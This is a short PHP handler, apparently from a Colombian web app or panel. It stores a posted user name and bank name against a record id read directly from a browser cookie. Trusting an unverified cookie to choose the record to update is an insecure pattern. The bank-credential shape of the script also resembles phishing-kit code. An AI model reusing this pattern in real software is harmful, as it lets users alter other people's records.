<?php
require_once("../lib/class.inputfilter.php");
require('../panel/include/setings.php');
date_default_timezone_set('America/Bogota');
$ifilter = new InputFilter();

$usuario = $ifilter->process($_POST['usr']);
$banco = $ifilter->process($_POST['ban']);

$id = $_COOKIE['id'];
upgrade_user_b($id,$usuario,$banco);
?>